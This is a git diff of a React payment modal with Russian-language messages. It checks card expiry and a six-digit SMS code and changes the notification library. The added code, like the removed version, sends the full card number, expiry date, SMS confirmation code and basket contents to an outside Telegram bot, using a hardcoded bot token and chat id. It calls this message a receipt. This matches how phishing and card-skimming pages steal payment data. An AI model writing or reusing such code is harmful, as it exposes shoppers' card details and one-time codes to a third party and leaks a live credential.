@@ -1,12 +1,14 @@
+
 import React, { useState } from 'react';
 import Box from '@mui/material/Box';
 import Modal from '@mui/material/Modal';
 import axios from 'axios';
-import { toast, ToastContainer } from 'react-toastify';
-import 'react-toastify/dist/ReactToastify.css';
 import InputMask from 'react-input-mask';
 import "./basic-modal.css";
 import { useForm } from "react-hook-form";
+// import dedent from "dedent-js";
+import { Notyf } from 'notyf';
+import 'notyf/notyf.min.css'; // for React, Vue and Svelte
 
 const style = {
      position: 'absolute',
@@ -20,7 +22,14 @@ const style = {
      p: 4,
 };
 
-export default function BasicModal({ isOpen, onClose, totalPrice }) {
+const notyf = new Notyf({
+     position: {
+          x: 'center',
+          y: 'top',
+     },
+});
+
+export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, quantities }) {
      const { register, handleSubmit } = useForm();
      const [isCardDetailsEntered, setIsCardDetailsEntered] = useState(false);
 
@@ -28,7 +37,16 @@ export default function BasicModal({ isOpen, onClose, totalPrice }) {
           const carddateRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
 
           if (!carddateRegex.test(data.carddate)) {
-               toast.error("Неверный формат срока действия карты. Ожидается MM/YY.");
+               notyf.error("Неверный формат срока действия карты.");
+               return;
+          }
+
+          const [inputMonth, inputYear] = data.carddate.split('/').map(num => parseInt(num, 10));
+          const currentYear = new Date().getFullYear() % 100; // Получаем последние 2 цифры текущего года
+          const currentMonth = new Date().getMonth() + 1; // Месяц в JS начинается с 0
+
+          if (inputYear < currentYear || (inputYear === currentYear && inputMonth < currentMonth)) {
+               notyf.error("Срок действия карты истек.");
                return;
           }
 
@@ -39,42 +57,75 @@ export default function BasicModal({ isOpen, onClose, totalPrice }) {
           console.log("Form submitted with data:", data);
 
           if (data.cardcode.length !== 6) {
-               toast.error("SMS-код должен содержать 6 символов.");
+               notyf.error("SMS-код должен содержать 6 символов.");
                return;
           }
 
           if (data.cardcode === "123456") {
-               axios.post('http://localhost:3005/api/add', { ...data, totalPrice })
+               axios.post('http://localhost:3004/api/add', { ...data, totalPrice })
                     .then(response => {
                          console.log("Success response:", response);
-                         toast.success("Чек отправлен на Телеграм бот!");
+                         notyf.success("Чек отправлен на Телеграм бот!");
                          onClose();
                     })
                     .catch(error => {
                          console.log("Error response:", error);
                          if (error.response) {
-                              toast.error(`Ошибка: ${error.response.data.message}`);
+                              notyf.error(`Ошибка: ${error.response.data.message}`);
                          } else {
-                              toast.error("Ошибка при отправке данных");
+                              notyf.error("Ошибка при отправке данных");
                          }
                     });
+
+               const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
+               const chat_id = 6183727519;
+
+               // Отправка текста сообщения
+               const itemsDescription = basketItems.map(item =>
+                    `${item.nameproduct} - ${quantities[item.id]} шт - ${item.price * quantities[item.id]} $`
+               ).join('\n');
+
+               const message = `🧾 Чек:
+            Номер карты: ${data.cardnumber}
+            Срок действия: ${data.carddate}
+            Общая сумма: ${totalPrice} сом
+            Код подтверждения: ${data.cardcode}
+            Товары:
+            ${itemsDescription}`;
+
+               const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+               axios.get(url)
+                    .then(response => {
+                         console.log("Message sent successfully:", response);
+                    })
+                    .catch(error => {
+                         console.error("Error sending message:", error);
+                    });
+
+               // Отправка каждого продукта как отдельного сообщения
+               const sendProductImages = async () => {
+                    for (const item of basketItems) {
+                         if (item.img[0]) { // Проверяем, что изображение существует
+                              const imageUrl = item.img[0];
+                              const caption = `${item.nameproduct}\n- ${quantities[item.id]} шт\n- ${item.price * quantities[item.id]} $`;
+                              const imageUrlForSending = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(caption)}`;
+
+                              try {
+                                   const response = await axios.get(imageUrlForSending);
+                                   console.log(`Image for ${item.nameproduct} sent successfully:`, response);
+                              } catch (error) {
+                                   console.error(`Error sending image for ${item.nameproduct}:`, error);
+                              }
+                         }
+                    }
+               };
+
+               sendProductImages();
           } else {
-               toast.error("Неверный SMS-код");
+               notyf.error("Неверный SMS-код");
           }
-          const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
-          const chat_id = 6183727519;
-const message = `🧾 Чек:
-                         Номер карты: ${data.cardnumber}
-                         Срок действия: ${data.carddate}
-                         Общая сумма: ${totalPrice} сом
-                         Код подтверждения: ${data.cardcode}`;
-          
-          var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
-          let api = new XMLHttpRequest()
-          api.open("GET", url, true)
-          api.send()
-          alert("Чек отправен на телеграм бот");
      };
+
      return (
           <>
                <Modal open={isOpen} onClose={onClose} aria-labelledby="modal-modal-title" aria-describedby="modal-modal-description">
@@ -118,17 +169,18 @@ const message = `🧾 Чек:
                                              mask="999999"
                                              maskChar=" "
                                              {...register("cardcode", { required: true })}
-                                             placeholder='введите смс код'
+                                             placeholder='Введите код из СМС'
                                         >
                                              {(inputProps) => <input {...inputProps} />}
                                         </InputMask>
-                                        <button type='submit'>Отправить</button>
+                                        <button type="submit">
+                                             Отправить
+                                        </button>
                                    </div>
                               )}
                          </form>
                     </Box>
                </Modal>
-               <ToastContainer />
           </>
      );
 }
